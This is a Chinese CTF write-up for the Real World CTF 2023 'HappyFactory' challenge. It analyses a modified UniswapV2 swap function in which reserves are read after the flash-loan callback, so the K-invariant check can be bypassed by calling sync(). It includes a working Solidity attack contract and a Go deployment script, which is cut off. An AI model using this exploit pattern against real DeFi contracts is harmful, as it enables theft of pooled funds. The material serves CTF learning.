[{"id":"e11ae42b703d221b2129f06adb945d20","title":"real world ctf 2023","content":"HappyFactory0x01 Intro题目的漏洞倒是不难，考察了变版的UniswapV2倒是有一处卡了好久。。。等下分析题目时说一下\n0x02 Code\nClick to see more\n附件合约\n/**\n *Submitted for verification at Etherscan.io on 2020-05-04\n */\n\npragma solidity =0.5.16;\n\ninterface IKonohaFactory &#123;\n    event PairCreated(\n        address indexed token0,\n        address indexed token1,\n        address pair,\n        uint256\n    );\n\n    function feeTo() external view returns (address);\n\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address pair);\n\n    function setFeeTo(address) external;\n\n    function setFeeToSetter(address) external;\n&#125;\n\ninterface IKonohaPair &#123;\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n    event Burn(\n        address indexed sender,\n        uint256 amount0,\n        uint256 amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint256 amount0In,\n        uint256 amount1In,\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n    function factory() external view returns (address);\n\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (\n            uint112 reserve0,\n            uint112 reserve1,\n            uint32 blockTimestampLast\n        );\n\n    function price0CumulativeLast() external view returns (uint256);\n\n    function price1CumulativeLast() external view returns (uint256);\n\n    function kLast() external view returns (uint256);\n\n    function mint(address to) external returns (uint256 liquidity);\n\n    function burn(address to)\n        external\n        returns (uint256 amount0, uint256 amount1);\n\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function skim(address to) external;\n\n    function sync() external;\n\n    function initialize(address, address) external;\n&#125;\n\ninterface IKonohaERC20 &#123;\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n&#125;\n\ninterface IERC20 &#123;\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n&#125;\n\ninterface IKonohaCallee &#123;\n    function KonohaCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n&#125;\n\ncontract KonohaERC20 is IKonohaERC20 &#123;\n    using SafeMath for uint256;\n\n    string public constant name = \"Konoha Liquidity\";\n    string public constant symbol = \"Konoha\";\n    uint8 public constant decimals = 18;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    bytes32 public DOMAIN_SEPARATOR;\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    mapping(address => uint256) public nonces;\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public &#123;\n        uint256 chainId;\n        assembly &#123;\n            chainId := chainid\n        &#125;\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n    &#125;\n\n    function _mint(address to, uint256 value) internal &#123;\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    &#125;\n\n    function _burn(address from, uint256 value) internal &#123;\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    &#125;\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) private &#123;\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    &#125;\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) private &#123;\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    &#125;\n\n    function approve(address spender, uint256 value) external returns (bool) &#123;\n        _approve(msg.sender, spender, value);\n        return true;\n    &#125;\n\n    function transfer(address to, uint256 value) external returns (bool) &#123;\n        _transfer(msg.sender, to, value);\n        return true;\n    &#125;\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) &#123;\n        if (allowance[from][msg.sender] != uint256(-1)) &#123;\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        &#125;\n        _transfer(from, to, value);\n        return true;\n    &#125;\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external &#123;\n        require(deadline >= block.timestamp, \"Konoha: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner,\n            \"Konoha: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    &#125;\n&#125;\n\ncontract KonohaPair is IKonohaPair, KonohaERC20 &#123;\n    using SafeMath for uint256;\n    using UQ112x112 for uint224;\n\n    uint256 public constant MINIMUM_LIQUIDITY = 10**3;\n    bytes4 private constant SELECTOR =\n        bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\n\n    address public factory;\n    address public token0;\n    address public token1;\n\n    uint112 public reserve0; // uses single storage slot, accessible via getReserves\n    uint112 public reserve1; // uses single storage slot, accessible via getReserves\n    uint32 public blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint256 public price0CumulativeLast;\n    uint256 public price1CumulativeLast;\n    uint256 public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n\n    uint256 private unlocked = 1;\n    modifier lock() &#123;\n        require(unlocked == 1, \"Konoha: LOCKED\");\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    &#125;\n\n    function getReserves()\n        public\n        view\n        returns (\n            uint112 _reserve0,\n            uint112 _reserve1,\n            uint32 _blockTimestampLast\n        )\n    &#123;\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    &#125;\n\n    function _safeTransfer(\n        address token,\n        address to,\n        uint256 value\n    ) private &#123;\n        (bool success, bytes memory data) = token.call(\n            abi.encodeWithSelector(SELECTOR, to, value)\n        );\n        require(\n            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n            \"Konoha: TRANSFER_FAILED\"\n        );\n    &#125;\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n    event Burn(\n        address indexed sender,\n        uint256 amount0,\n        uint256 amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint256 amount0In,\n        uint256 amount1In,\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() public &#123;\n        factory = msg.sender;\n    &#125;\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external &#123;\n        require(msg.sender == factory, \"Konoha: FORBIDDEN\"); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    &#125;\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(\n        uint256 balance0,\n        uint256 balance1,\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private &#123;\n        require(\n            balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1),\n            \"Konoha: OVERFLOW\"\n        );\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast +=\n                uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *\n                timeElapsed;\n            price1CumulativeLast +=\n                uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *\n                timeElapsed;\n        &#125;\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    &#125;\n\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1)\n        private\n        returns (bool feeOn)\n    &#123;\n        address feeTo = IKonohaFactory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint256 _kLast = kLast; // gas savings\n        if (feeOn) &#123;\n            if (_kLast != 0) &#123;\n                uint256 rootK = Math.sqrt(uint256(_reserve0).mul(_reserve1));\n                uint256 rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) &#123;\n                    uint256 numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint256 denominator = rootK.mul(5).add(rootKLast);\n                    uint256 liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                &#125;\n            &#125;\n        &#125; else if (_kLast != 0) &#123;\n            kLast = 0;\n        &#125;\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint256 liquidity) &#123;\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        uint256 balance0 = IERC20(token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(token1).balanceOf(address(this));\n        uint256 amount0 = balance0.sub(_reserve0);\n        uint256 amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) &#123;\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        &#125; else &#123;\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        &#125;\n        require(liquidity > 0, \"Konoha: INSUFFICIENT_LIQUIDITY_MINTED\");\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint256(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(address to)\n        external\n        lock\n        returns (uint256 amount0, uint256 amount1)\n    &#123;\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        uint256 balance0 = IERC20(_token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(_token1).balanceOf(address(this));\n        uint256 liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(\n            amount0 > 0 &amp;&amp; amount1 > 0,\n            \"Konoha: INSUFFICIENT_LIQUIDITY_BURNED\"\n        );\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint256(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock &#123;\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Konoha: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n\n        uint256 balance0;\n        uint256 balance1;\n        &#123;\n            // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 &amp;&amp; to != _token1, \"Konoha: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                IKonohaCallee(to).KonohaCall(\n                    msg.sender,\n                    amount0Out,\n                    amount1Out,\n                    data\n                );\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        &#125;\n\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1,\n            \"Konoha: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint256 amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;//1e18\n        uint256 amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;//0\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Konoha: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        &#123;\n            // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n            uint256 balance0Adjusted = balance0.mul(1000).sub(\n                amount0In.mul(25)\n            );\n            uint256 balance1Adjusted = balance1.mul(1000).sub(\n                amount1In.mul(25)\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint256(_reserve0).mul(_reserve1).mul(1000**2),\n                \"Konoha: K\"\n            );\n        &#125;\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    &#125;\n\n    // force balances to match reserves\n    function skim(address to) external lock &#123;\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(\n            _token0,\n            to,\n            IERC20(_token0).balanceOf(address(this)).sub(reserve0)\n        );\n        _safeTransfer(\n            _token1,\n            to,\n            IERC20(_token1).balanceOf(address(this)).sub(reserve1)\n        );\n    &#125;\n\n    // force reserves to match balances\n    function sync() external &#123;\n        _update(\n            IERC20(token0).balanceOf(address(this)),\n            IERC20(token1).balanceOf(address(this)),\n            reserve0,\n            reserve1\n        );\n    &#125;\n&#125;\n\ncontract KonohaFactory is IKonohaFactory &#123;\n    address public feeTo;\n    address public feeToSetter;\n\n    mapping(address => mapping(address => address)) public getPair;\n    address[] public allPairs;\n\n    event PairCreated(\n        address indexed token0,\n        address indexed token1,\n        address pair,\n        uint256\n    );\n\n    constructor(address _feeToSetter) public &#123;\n        feeToSetter = _feeToSetter;\n    &#125;\n\n    function allPairsLength() external view returns (uint256) &#123;\n        return allPairs.length;\n    &#125;\n\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address pair)\n    &#123;\n        require(tokenA != tokenB, \"Konoha: IDENTICAL_ADDRESSES\");\n        (address token0, address token1) = tokenA &lt; tokenB\n            ? (tokenA, tokenB)\n            : (tokenB, tokenA);\n        require(token0 != address(0), \"Konoha: ZERO_ADDRESS\");\n        require(getPair[token0][token1] == address(0), \"Konoha: PAIR_EXISTS\"); // single check is sufficient\n        bytes memory bytecode = type(KonohaPair).creationCode;\n        bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n        assembly &#123;\n            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)\n        &#125;\n        IKonohaPair(pair).initialize(token0, token1);\n        getPair[token0][token1] = pair;\n        getPair[token1][token0] = pair; // populate mapping in the reverse direction\n        allPairs.push(pair);\n        emit PairCreated(token0, token1, pair, allPairs.length);\n    &#125;\n\n    function setFeeTo(address _feeTo) external &#123;\n        require(msg.sender == feeToSetter, \"Konoha: FORBIDDEN\");\n        feeTo = _feeTo;\n    &#125;\n\n    function setFeeToSetter(address _feeToSetter) external &#123;\n        require(msg.sender == feeToSetter, \"Konoha: FORBIDDEN\");\n        feeToSetter = _feeToSetter;\n    &#125;\n\n    function test() public view returns (bytes32) &#123;\n        return\n            keccak256(\n                \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n            );\n    &#125;\n&#125;\n\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n\nlibrary SafeMath &#123;\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) &#123;\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    &#125;\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) &#123;\n        require((z = x - y) &lt;= x, \"ds-math-sub-underflow\");\n    &#125;\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) &#123;\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    &#125;\n&#125;\n\n// a library for performing various math operations\n\nlibrary Math &#123;\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) &#123;\n        z = x &lt; y ? x : y;\n    &#125;\n\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\n    function sqrt(uint256 y) internal pure returns (uint256 z) &#123;\n        if (y > 3) &#123;\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x &lt; z) &#123;\n                z = x;\n                x = (y / x + x) / 2;\n            &#125;\n        &#125; else if (y != 0) &#123;\n            z = 1;\n        &#125;\n    &#125;\n&#125;\n\n// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))\n\n// range: [0, 2**112 - 1]\n// resolution: 1 / 2**112\n\nlibrary UQ112x112 &#123;\n    uint224 constant Q112 = 2**112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) &#123;\n        z = uint224(y) * Q112; // never overflows\n    &#125;\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;\n        z = x / uint224(y);\n    &#125;\n&#125;\n\n\n\n\n题目合约：\n其余部分几乎一样的，就是换成了interface\ncontract Happy &#123;\n    event tokenA_tokenB(address, address);\n    IHappyFactory factory =\n        IHappyFactory(address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36));\n\n    function setup() public returns (address, address) &#123;\n        Token tokenA = new Token();\n        Token tokenB = new Token();\n        address pair = factory.createPair(address(tokenA), address(tokenB));\n        tokenA.mint(pair, 10 ether);\n        tokenB.mint(pair, 10 ether);\n        IHappyPair(pair).sync();\n        tokenA.mint(msg.sender, 1 ether);\n        emit tokenA_tokenB(address(tokenA), address(tokenB));\n        return (address(tokenA), address(tokenB));\n    &#125;\n&#125;\n\ncontract Greeter &#123;\n    address happy_contract;\n    address public tokenA;\n    address public tokenB;\n    address deployer;\n\n    constructor() public &#123;\n        happy_contract = address(0x2d55bF802F341F969F777F94f7A39604133BE4F6);\n        (tokenA, tokenB) = Happy(happy_contract).setup();\n        deployer = msg.sender;\n    &#125;\n\n    function airdrop() public &#123;\n        IERC20(tokenA).transfer(msg.sender, 1 ether);\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return IERC20(tokenB).balanceOf(deployer) >= 1 ether;\n    &#125;\n&#125;\n\n\n\n0x03 Analyse分析代码看来这道题目就是使用了一个变版的uniswapV2的代码，重点在于swap函数，我们来看一下是哪里出现了问题\n正确版本：\nfunction swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock &#123;\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves();\n        require(\n            amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1,\n            \"UniswapV2: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint256 balance0;\n        uint256 balance1;\n        &#123;\n            // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 &amp;&amp; to != _token1, \"UniswapV2: INVALID_TO\");\n            if (amount0Out > 0) IERC20(_token0).safeTransfer(to, amount0Out);\n            if (amount1Out > 0) IERC20(_token1).safeTransfer(to, amount1Out);\n            if (data.length > 0)\n                IUniswapV2Callee(to).uniswapV2Call(\n                    msg.sender,\n                    amount0Out,\n                    amount1Out,\n                    data\n                );\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        &#125;\n        uint256 amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint256 amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"UniswapV2: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        &#123;\n            // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n            uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n            uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint256(_reserve0).mul(_reserve1).mul(1000 ** 2),\n                \"UniswapV2: K\"\n            );\n        &#125;\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    &#125;\n\n\n题目版本：\nfunction swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock &#123;\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Konoha: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n\n        uint256 balance0;\n        uint256 balance1;\n        &#123;\n            // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 &amp;&amp; to != _token1, \"Konoha: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                IKonohaCallee(to).KonohaCall(\n                    msg.sender,\n                    amount0Out,\n                    amount1Out,\n                    data\n                );\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        &#125;\n\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1,\n            \"Konoha: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint256 amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;//1e18\n        uint256 amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;//0\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Konoha: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        &#123;\n            // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n            uint256 balance0Adjusted = balance0.mul(1000).sub(\n                amount0In.mul(25)\n            );\n            uint256 balance1Adjusted = balance1.mul(1000).sub(\n                amount1In.mul(25)\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint256(_reserve0).mul(_reserve1).mul(1000**2),\n                \"Konoha: K\"\n            );\n        &#125;\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    &#125;\n\n对比之下比较容易发现实际上两段代码的逻辑差异就是调用getreserve()的顺序不一样，正是由于顺序的不同造成了该题目的漏洞函数getreserve0()发生在flashloan之后，这也就意味着我们可以在flashloan过程中通过sync()函数操纵reserve，从而达到绕过K值检测\n针对题目数据做一个简单的构造来看一下\n题目合约部署之后两个token的reerse都为10，但是我们可以通过airdrop获得一个tokenA，这个A先不用，调用swap函数，tokenAout设置为0，tokenBout设置为1，此时swap函数中执行到外部调用（就是在这里卡了几个小时，题目合约都是interface形式，没有给出外部调用的函数名，甚至还写了个脚本把byteode一位一位的跑了一遍。。最后还是根据KonahaPair合约函数名试出来的），通过攻击合约中的恶意函数，调用sync，更新reserve，同时将我们的一个TokenA转账到pair合约\n此时\nbalanceA：11\nreserveA：10\nbalanceB：9\nreserveB：9\namountAIn：1\nAmountBIn：1\n\n经过K值检测之后数值大8左右具体记不清了，这样的话满足了K值检测，用一个ToKenA获得到了一个TokenB，再将获得到的TokenB转账到deploy地址下就可以了\n0x04 Attackcontract attack &#123;\n    Greeter public airdrop;\n    IHappyPair public target;\n    IERC20 public TokenA;\n    IERC20 public TokenB;\n\n    constructor()  &#123;\n        TokenA = IERC20(0x7FB26050C2f2dCB3C5A55040a2a59ba586e15131);\n        TokenB = IERC20(0xA68Ec5cF94031766CAdF014F4aCdFc74163462bb);\n        airdrop = Greeter(0xef7C82a5C917BBf442a385ba971905E187cFb56E);\n        target = IHappyPair(0x6dD412b76987CFCfcBDdb633A36832cdc9B939B5);\n        airdrop.airdrop();\n    &#125;\n     function step()public&#123;\n        target.swap(0, 1e18, address(this), \"0x1234\");\n    &#125;\n    function HappyCall(address q,uint w,uint e,bytes calldata data)external&#123;\n        target.sync();\n        TokenA.transfer(address(target), TokenA.balanceOf(address(this)));\n    &#125;\n    function over(address to)public&#123;\n        TokenB.transfer(to, 1e18);\n    &#125;\n&#125;\n\nPwn.go\nchainID, err := client.NetworkID(context.Background())\n\tauth, _ := bind.NewKeyedTransactorWithChainID(privateKey, chainID)\n\tauth.Nonce = big.NewInt(int64(nonce))\n\tauth.Value = big.NewInt(0)      // in wei\n\tauth.GasLimit = uint64(3000000) // in units\n\tauth.GasPrice = gasPrice\n\n\t//address, tx, _, err := attack.DeployAttack(auth, client)\n\t//\n\t//if err != nil &#123;\n\t//\tlog.Fatal(err)\n\t//&#125;\n\t//\n\t//fmt.Println(address.Hex())\n\t//fmt.Println(tx.Hash().Hex())\n\t//instance, _ := attack.NewAttack(common2.HexToAddress(\"0xb9B01490cEE9d1FC84Ba19b55AFeAE7658fA8c6f\"), client)\n\t//tx1, _ := instance.Step(auth)\n\t//fmt.Println(tx1.To(), tx1.Hash())\n\tinstance, _ := attack.NewAttack(common2.HexToAddress(\"0xb9B01490cEE9d1FC84Ba19b55AFeAE7658fA8c6f\"), client)\n\ttx1, _ := instance.Over(auth, common2.HexToAddress(\"0x4A843418Aa8679D9709A08261d48aC9AE6cEc1c3\"))\n\tfmt.Println(tx1.To(), 